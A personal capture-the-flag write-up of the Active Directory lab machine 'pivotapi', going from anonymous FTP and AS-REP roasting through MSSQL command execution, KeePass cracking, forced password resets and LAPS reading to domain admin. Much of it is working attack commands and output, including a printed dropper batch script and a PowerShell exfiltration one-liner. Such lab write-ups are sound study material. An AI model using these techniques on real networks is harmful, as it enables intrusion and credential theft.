---
description: One of my favourite AD Machines!
---

# pivotapi

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.228.115
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 23:06 +08
Nmap scan report for 10.129.228.115
Host is up (0.012s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49695/tcp open  unknown
49706/tcp open  unknown
```

### FTP --> AS-REP Roast

Whenever there's an FTP port open, we can check for anonymous access, and it works for this machine:

```
$ ftp 10.129.228.115
Connected to 10.129.228.115.
220 Microsoft FTP Service
Name (10.129.228.115:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49775|)
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
```

There seems to be PDFs within this folder. I downloaded the `README.txt` file first.&#x20;

```
$ cat README.txt       
VERY IMPORTANT!!
Don't forget to change the download mode to binary so that the files are not corrupted.
```

Alright, we can change to binary mode and then download all of these files to our machine:

```
ftp> binary
200 Type set to I.
ftp> prompt off 
Interactive mode off.
ftp> mget *
```

I viewed all the PDFs, which didn't include anything useful. Next, we can use `exiftool` to view the metadata of each file in case there's something like a vulnerable version of PDF reader indicated. Some of them contained username fields:

```
======== notes2.pdf
ExifTool Version Number         : 12.57
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 279 kB
File Modification Date/Time     : 2020:08:08 19:34:25+08:00
File Access Date/Time           : 2023:06:20 23:09:05+08:00
File Inode Change Date/Time     : 2023:06:20 23:09:05+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)
```

I put all the usernames into a single file, and also took note of the domain used here. Here are all the users:

```
byron.gronseth
bryon_gronseth
b.gronseth
bryon_g
bryon.g
bryon
gronseth
saif
Kaorz
alex
```

The first username might need some permutation, so I included some combinations in my username list. We can then use `impacket-GetNPUsers` since we have a username list:

{% code overflow="wrap" %}
```
$ impacket-GetNPUsers -dc-ip LicorDeBellota.htb -usersfile users -outputfile hashes LicorDeBellota.htb/
$ cat hashes    
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:2df046b679a372879de71bc55877ee5a$af8417e1369a1eff28a23fddbb66829fc7ffea53b61ba17e1d016a6f4ed97d98e18cce9b7111a8d78d987d2e1e7b46bfb059f3c8e0006f79647044b6cc5ac9ccc034c4b9df370913173c4abe6343c12bd2cc6e06fe9051f9d7c27354932dc438cdbc853ba6f64597b400071a17a76259d9608229c6143876b520fed634d1c0dfdcda4f67c590e3413dda42c0457f7cc79245297762a556c76f242b2b62f868522ac0df5b8d252389d7c2d7b7522f6e0b3d5b9d60f89bcdfcce838e471f1a454cc95a1260c50ed1fee9e11f24faa0f1203d47f5f0ab6693deeec655fe185c9991e77fa5705a7166bbfca60a886d7346820fc183a5c576359f
```
{% endcode %}

This works! The hash can be easily cracked using `john`.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Roper4155        ($krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB)     
1g 0:00:00:07 DONE (2023-06-20 23:16) 0.1426g/s 1522Kp/s 1522Kc/s 1522KC/s Roryarthur..Ronald8
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have credentials!&#x20;

### SMB + Bloodhound

I tried to view the shares, but we don't have access to anything special:

```
$ smbmap -u kaorz -p Roper4155 -H 10.129.228.115  
[+] IP: 10.129.228.115:445      Name: LicorDeBellota.htb                                
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  READ ONLY       Recurso compartido del servidor de inicio de sesión
        
```

We can take a look at the shares anyway. The `NETLOGON` share contained a `HelpDesk` file:

```
$ smbclient -U 'Kaorz' //10.129.228.115/NETLOGON          
Password for [WORKGROUP\Kaorz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 18:42:28 2020
  ..                                  D        0  Sat Aug  8 18:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 23:40:36 2020

                5158399 blocks of size 4096. 1105115 blocks available
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 23:40:36 2020
  ..                                  D        0  Sun Aug  9 23:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 18:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 19:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 19:42:20 2020

                5158399 blocks of size 4096. 1105110 blocks available
```

Then, we can take a look at these files:

```
$ file Restart-OracleService.exe 
Restart-OracleService.exe: PE32+ executable (console) x86-64, for MS Windows
$ file Server\ MSSQL.msg        
Server MSSQL.msg: CDFV2 Microsoft Outlook Message
$ file WinRM\ Service.msg             
WinRM Service.msg: CDFV2 Microsoft Outlook Message
```

I transferred this to my Windows VM for some reverse engineering.&#x20;

I also used `bloodhound-python` to collect information about the domain for me. The first time I ran it, it generated this error:

```
WARNING: DCE/RPC connection failed: [Errno Connection error (pivotapi.licordebellota.htb:88)] [Errno -2] Name or service not known
INFO: Done in 00M 02
```

So we have to add another subdomain to our `/etc/hosts` file to enumerate properly. Then, we can run the command again:

```
$ bloodhound-python -d LicorDeBellota.htb -u Kaorz -p Roper4155 -c all -ns 10.129.228.115
INFO: Found AD domain: licordebellota.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
INFO: Found 28 users
INFO: Found 58 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 02S
```

Afterwards, start `neo4j` and `bloodhound`. The names of the box are in Spanish, so take note of that. However, the `bloodhound` graph showcased nothing of interest for our current user and we have no privileges. When looking at all domain users, we find a `svc_mssql` user present:

<figure><img src="../../../.gitbook/assets/image (1949).png" alt=""><figcaption></figcaption></figure>

The `nmap` scan earlier shows that port 1433 is indeed open. Checking this user's group memberships shows that it is part of the WinRM group, which is in turn part of the Remote Administration Group (I think).

<figure><img src="../../../.gitbook/assets/image (4059).png" alt=""><figcaption></figcaption></figure>

The steps are rather clear, we need to somehow reverse engineer that `.exe` file to gain a shell as the `svc_mssql` user.&#x20;

### Reverse Engineering&#x20;

I transferred this over to my Windows VM. Running it seems to do nothing oddly:

<figure><img src="../../../.gitbook/assets/image (2382).png" alt=""><figcaption></figcaption></figure>

I took a look at the logs created using Sysmon, and found some weird commands being executed. Firstly, this thing created a `.bat` file:

<figure><img src="../../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>

Afterwards, it used it ot do something else:

<figure><img src="../../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

It also seems that this file is being destroyed by the binary after running. To catch this file, we would have to use a Powershell infinite loop that would keep checking for both directories and the `.bat` file being created, and then read the output of it.&#x20;

It was rather difficult to catch this `.bat` file for some reason, and I took a lot of runs before being able to. I used a simple Powershell loop that reads the file:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path C:\users\user\AppData\Local\Temp\ -Recurse -Filter *.bat | ForEach-Object { copy $_.fullname .\$_name ; echo $_.name }

## in another PS shell
while ($true) { .\Restart-OracleService.exe }
```
{% endcode %}

Afterwards, I was able to copy the file and view its contents. It's rather long, so I'll truncate it a bit:

```batch
@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<TRUNCATED>

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe

:error
```

Since we have this `.bat` file, we can simply execute it after using `set` to change our username temporarily. We can also remove the `del` commands to preserve the files:

```
set username=cybervaca
.\<name>.bat
```

This would create the files that we want (after taking a few minutes). Afterwards, we would get a `monta.ps1` and a `restart-service.exe` file on our machine. Also, it detects this as raare, so make sure to include the needed exclusions from Defender.&#x20;

```
-a----         6/20/2023  11:59 PM        1746599 B811.bat
-a----         6/21/2023  12:05 AM            273 monta.ps1
-a----         6/21/2023  12:05 AM        1202440 oracle.txt
-a----         6/21/2023  12:06 AM         864768 restart-service.exe
```

Afterwards, we can reverse engineer the `restart-service.exe` file. Running it just produces this ASCII art:

```
PS C:\ProgramData> .\restart-service.exe

    ____            __             __     ____                  __
   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

                                                by @HelpDesk 2010
```

It doesn't generate any logs of interest in Sysmon, so we have to delve deeper into the processes spawned. In this case, I used API Monitor to do this. When I ran the binary within API monitor, it generated quite a lot of stuff. I disabled the filter to view everything:

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

I tried searching for 'Password' and found it here!

<figure><img src="../../../.gitbook/assets/image (1131).png" alt=""><figcaption></figcaption></figure>

### MS-SQL Access --> PrintSpoof Fail

Now that we have creds for `svc_oracle`, let's try to access the database as it. However, it appears that this `svc_oracle` user is not present anywhere within the domain users, and only `svc_mssql` is.&#x20;

The password was contained both `oracle` and `2010`. I was stuck here for a long time, and looked at a guide. Turns out we just need to change the password to have `mssql` instead of `oracle` and `2020` instead of `2010` (which I felt was an unecessary step for this machine at this point).&#x20;

Anyways, we can then access the database as the `sa` user.&#x20;

<figure><img src="../../../.gitbook/assets/image (1618).png" alt=""><figcaption></figcaption></figure>

Next, we can check whether we have `xp_cmdshell` access.

<figure><img src="../../../.gitbook/assets/image (2413).png" alt=""><figcaption></figcaption></figure>

We do! I looked around the file system to find some interesting stuff. First, I checked the users:

{% code overflow="wrap" %}
```
08/08/2020  19:46    <DIR>          .                                                                                                                                                                                                                             
08/08/2020  19:46    <DIR>          ..                                                                                                                                                                                                                            
08/08/2020  21:48    <DIR>          3v4Si0N                                                                                                                                                                                                                       
11/08/2020  17:32    <DIR>          administrador                                                                                                                                                                                                                 
08/08/2020  00:14    <DIR>          cybervaca                                                                                                                                                                                                                     
08/08/2020  19:46    <DIR>          Dr.Zaiuss                                                                                                                                                                                                                     
08/08/2020  19:21    <DIR>          jari                                                                                                                                                                                                                          
08/08/2020  00:14    <DIR>          Public                                                                                                                                                                                                                        
08/08/2020  19:22    <DIR>          superfume                                                                                                                                                                                                                     
08/08/2020  19:45    <DIR>          svc_mssql
```
{% endcode %}

I cannot access any of these files as my current user, which is quite annoying. The next thing to check would be our privileges, since we are in fact, a service account user. This means that we can potentially have the `SeImpersonatePrivilege` enabled, which we do!

```
Nombre de privilegio          Descripción                                       Estado                                                                                                                                                                            
============================= ================================================= =============                                                                                                                                                                     
SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado                                                                                                                                                                     
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado                                                                                                                                                                     
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado                                                                                                                                                                     
SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada                                                                                                                                                                        
SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada                                                                                                                                                                        
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada                                                                                                                                                                        
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada                                                                                                                                                                        
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
```

Because this is enabled, we can use `PrintSpoofer.exe` to execute commands. Problem is, I am not able to transfer the binary to the machine since it complains that there's no route to my machine. So, we have to use `base64` encoded strings to do this.

When googling for MSSQL Shells with upload capabilities, I came across this:

{% embed url="https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py" %}

This shell works after changing the credentials:

<figure><img src="../../../.gitbook/assets/image (2384).png" alt=""><figcaption></figcaption></figure>

Now, we can upload `PrintSpoofer.exe` to the machine.&#x20;

<figure><img src="../../../.gitbook/assets/image (3853).png" alt=""><figcaption></figcaption></figure>

However, this just doesn't work for some reason. I think the author must've patched the usage of PrintSpoofer, because in theory it would lead to an automatic root shell.&#x20;

### Port Forward --> WinRM Fail

I noted that it was not possible for me to connect back to my host, probably due to firewall rules blocking inbound WinRM connections. We can read the rules using `Get-NetFirewallRules`. Again, it's all in Spanish.&#x20;

```
Name                  : {647E1258-90D4-47EE-B28A-82DE515A1326}
DisplayName           : Deny WinRM
Description           : 
DisplayGroup          : 
Group                 : 
Enabled               : True
Profile               : Any
Platform              : {}
Direction             : Inbound
Action                : Block
EdgeTraversalPolicy   : Block
LooseSourceMapping    : False
LocalOnlyMapping      : False
Owner                 : 
PrimaryStatus         : OK
Status                : Se analizó la regla correctamente desde el almacén. (65536)
EnforcementStatus     : NotApplicable
PolicyStoreSource     : PersistentStore
PolicyStoreSourceType : Local
```

In this case, we would have to proxy our traffic using the MSSQL instance somehow. Googling for MSSQL Proxy leads me to this project:

{% embed url="https://github.com/blackarrowsec/mssqlproxy" %}

We can download the compiled DLLs and modified `mssqslclient.py` file onto our Kali machine. Then, we can use our UPLOAD shell to upload the `reciclador.dll` file:

<figure><img src="../../../.gitbook/assets/image (2908).png" alt=""><figcaption></figcaption></figure>

Then we can install the `assembly.dll` file (which has been renamed).

<figure><img src="../../../.gitbook/assets/image (3307).png" alt=""><figcaption></figcaption></figure>

Then we can runthe same command using `-start -reciclador 'C:\Windows\Temp\reciclador.dll`.&#x20;

This would open a listener port on our port 1337, which is supposed to let us conenct via WinRM in, but I kept getting this error when running it.&#x20;

```
$ python2 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -start -reciclador 'C:\Windows\Temp\reciclador.dll'/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
[*] Proxy mode: start
[*] Listening on port 1337...
[*] ACK from server!
[*] Bye!
```

The connection kept cutting out when I connected via this method, so this again, doesn't work.&#x20;

### Remote Powershell --> Keepass Crack

My last option was to use `base64` encoded Powershell commands to run stuff on the machine (at this point I was looking at a writeup). 0xdf used this in his Unintended Methods part of his writeup:

```powershell
$user='LicorDeBellota.htb\svc_mssql'; 
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force; 
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
try { 
  Invoke-Command -ScriptBlock { [Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\users\svc_mssql\desktop\credentials.kdbx')) | Out-File C:\programdata\0xdf.txt } -ComputerName PivotAPI -Credential $cred 
} catch { 
  echo $_.Exception.Message
}
```

I used his command to get the KeePass database out.&#x20;

```
$ file decoded           
decoded: Keepass password database 2.x KDBX
```

Afterwards, we can crack this database password using `keepass2john`.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt kp_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mahalkita        (decoded)     
1g 0:00:00:00 DONE (2023-06-21 11:22) 1.470g/s 305.8p/s 305.8c/s 305.8C/s alyssa..jeremy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then we can access the database:

```
$ kpcli -kdb decoded            
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> 

kpcli:/Database/Windows> show 0 -f 

Title: SSH
Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
  URL: 
Notes: 
```

Then, we can finally access the user here:

<figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Back to Bloodhound

Now that we have a new user to play with, we should take a look at the Bloodhound output again. Here, we find that our current user has `GenericAll` privileges over some other users:

<figure><img src="../../../.gitbook/assets/image (3595).png" alt=""><figcaption></figcaption></figure>

Only the `Dr.Zaiuss` has a file in `C:\Users`, so that's the next step. We also find that this user has control over `superfume`, which in turn is part of the Developers group:

<figure><img src="../../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

Those are the next obvious steps.

### ForceChangePassword

We can upload PowerView.ps1 via `scp` to the current user's directory, and then run these:

<pre class="language-powershell"><code class="lang-powershell"><strong>. .\PowerView.ps1
</strong><strong>$pass = ConvertTo-SecureString 'Password@123' -AsPlainText -Force 
</strong>Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
</code></pre>

Since `dr.zaiuss` is not part of the SSH group, we have to port forward via `ssh` to access that user using `evil-winrm`.&#x20;

```
$ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh -L 5985:127.0.0.1:5985 3V4Si0N@LicorDeBellota.htb
```

<figure><img src="../../../.gitbook/assets/image (1452).png" alt=""><figcaption></figcaption></figure>

Then, we can upload PowerView.ps1 and run the same commands with `superfume` this time. Since `superfume` is also not part of the SSH group, we can just use `evil-winrm` again:

<figure><img src="../../../.gitbook/assets/image (3057).png" alt=""><figcaption></figcaption></figure>

### Developer RE --> Creds

Within the main `C:\` directory, there's a Developers file:

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:23 PM                Developers
d-----         8/8/2020  12:53 PM                inetpub
d-----         8/8/2020  10:48 PM                PerfLogs
d-r---        2/19/2021   1:42 PM                Program Files
d-----         8/9/2020   5:06 PM                Program Files (x86)
d-r---         8/8/2020   7:46 PM                Users
d-----        4/29/2021   5:31 PM                Windows
```

`superfume` is part of the group, so we can access and read the files within it:

```
    Directorio: C:\Developers


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:26 PM                Jari
d-----         8/8/2020   7:23 PM                Superfume

    Directorio: C:\Developers\Jari


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020   7:26 PM           3676 program.cs
-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe
```

We can take a look at the `.cs` program:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;

namespace restart_oracle
{
    class Program
    {
        public class RC4
        {

            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;

                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];

                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }

            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }

            public static byte[] StringToByteArray(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
            }

        }

        static void Main()
        {

            string banner = @"
    ____            __             __                               __
   / __ \___  _____/ /_____ ______/ /_   ____ ___  ______________ _/ /
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / __ `__ \/ ___/ ___/ __ `/ /
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / / / / / (__  |__  ) /_/ / /
/_/ |_|\___/____/\__/\__,_/_/   \__/  /_/ /_/ /_/____/____/\__, /_/
                                                             /_/
                                                 by @HelpDesk 2020

";
            byte[] key = Encoding.ASCII.GetBytes("");
            byte[] password_cipher = { };
            byte[] resultado = RC4.Decrypt(key, password_cipher);
            Console.WriteLine(banner);
            Thread.Sleep(5000);
            System.Diagnostics.Process psi = new System.Diagnostics.Process();
            System.Security.SecureString ssPwd = new System.Security.SecureString();
            psi.StartInfo.FileName = "c:\\windows\\syswow64\\cmd.exe";
            psi.StartInfo.Arguments = "/c sc.exe stop SERVICENAME ; sc.exe start SERVICENAME";
            psi.StartInfo.RedirectStandardOutput = true;
            psi.StartInfo.UseShellExecute = false;
            psi.StartInfo.UserName = "Jari";
            string password = "";
            for (int x = 0; x < password.Length; x++)
            {
               ssPwd.AppendChar(password[x]);
            }
            password = "";
            psi.StartInfo.Password = ssPwd;
            psi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            psi.Start();

        }
    }
}
```

It appears we have another Reverse Engineering to do. There are some credentials being passed around within this program. In this case, we can grab this binary and transfer it back to our Windows machine for some reverse engineering.&#x20;

Since they provided the source code in C#, I opened this binary up in `dnSpy`. In this, we see the completed program with the correct cipher:

<figure><img src="../../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

We can set a breakpoint at the `Console.WriteLine` function, which is right after the `Decrypt` function. Then, within the local variables, we would see this part here:

<figure><img src="../../../.gitbook/assets/image (2369).png" alt=""><figcaption></figcaption></figure>

The `array` variable contains the decoded password, and we can convert all of this to text.&#x20;

<figure><img src="../../../.gitbook/assets/image (3330).png" alt=""><figcaption></figcaption></figure>

We can then grab access to the user `jari.`

<figure><img src="../../../.gitbook/assets/image (3504).png" alt=""><figcaption></figcaption></figure>

### ForceChangePassword  --> Account Operators

This new user is part of a new group:

```
*Evil-WinRM* PS C:\Users\jari\Documents> net user jari
Nombre de usuario                          jari
Nombre completo                            Jari Laox
Comentario
Comentario del usuario
C¢digo de pa¡s o regi¢n                    000 (Predeterminado por el equipo)
Cuenta activa                              S¡
La cuenta expira                           Nunca

Ultimo cambio de contrase¤a                04/05/2021 20:11:39
La contrase¤a expira                       Nunca
Cambio de contrase¤a                       05/05/2021 20:11:39
Contrase¤a requerida                       S¡
El usuario puede cambiar la contrase¤a     S¡

Estaciones de trabajo autorizadas          Todas
Script de inicio de sesi¢n
Perfil de usuario
Directorio principal
Ultima sesi¢n iniciada                     08/08/2020 16:21:57

Horas de inicio de sesi¢n autorizadas      Todas

Miembros del grupo local                   *Usuarios de administr
Miembros del grupo global                  *Usuarios del dominio
                                           *Developers
                                           *WinRM
```

Going back to Bloodhound, we see that the new user `jari` has `ForceChangePassword` privilege over two other users, with one being a bit more important than the other:

<figure><img src="../../../.gitbook/assets/image (3678).png" alt=""><figcaption></figcaption></figure>

The `gibdeon` user is part of the Account Operations group (after translation). We can first reset the user's password using the same commands as the other password resets `gibdeon` user is not part of either SSH or WinRM groups, so we probably use remote Powershell scriptblocks to abuse this.&#x20;

The Account Operators group has `GenericAll` privileges over the `LAPS READ` group, and can also create new non-administrator accounts within the domain (in-built AD privilege).

<figure><img src="../../../.gitbook/assets/image (3036).png" alt=""><figcaption></figcaption></figure>

Since we basically have access to all groups in this domain, we can just add our `jari` user to both `LAPS READ` and `LAPS ADM`.&#x20;

### LAPS Read

First, we have to import a `PSCredential` object in order to execute commands as `gibdeon` from our `jari` shell:

```powershell
. .\PowerView.ps1
$pass = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass
$cred = New-Object System.Management.Automation.PSCredential('gibdeon', $pass)
```

Afterwards, we can add ourselves to the `LAPS READ` and `LAPS ADM` groups.&#x20;

```powershell
Add-DomainGroupMember -Identity 'LAPS ADM' -Credential $cred -Members jari
Add-DomainGroupMember -Identity 'LAPS READ' -Credential $cred -Members jari
```

Then, we can read it:

```powershell
*Evil-WinRM* PS C:\Users\jari\Documents> Get-AdmPwdPassword -ComputerName PivotAPI | fl


ComputerName        : PIVOTAPI
DistinguishedName   : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
Password            : x6IiaQd8sOmUW5Y90FNG
ExpirationTimestamp : 6/21/2023 5:05:11 PM
```

Afterwards, we can simply `evil-winrm` into the `administrador` account. **Because this box is in Spanish, the name also differs**.&#x20;

```
*Evil-WinRM* PS C:\Users\jari\Documents> net user s                                   s

Cuentas de usuario de \\

-------------------------------------------------------------------------------
0xdf                     0xVIC                    3v4Si0N
Administrador            aDoN90                   borjmz
cybervaca                Dr.Zaiuss                Fiiti
FrankyTech               Gh0spp7                  gibdeon
Invitado                 ippsec                   jari
Jharvar                  Kaorz                    krbtgt
lothbrok                 manulqwerty              OscarAkaElvis
socketz                  sshd                     StooormQ
superfume                svc_mssql                v1s0r
```

<figure><img src="../../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

The `root.txt` flag is located within `C:\Users\cybervaca\desktop`. Doing CRTO and reading about Windows Auth helped a lot for this machine. Rooted!&#x20;
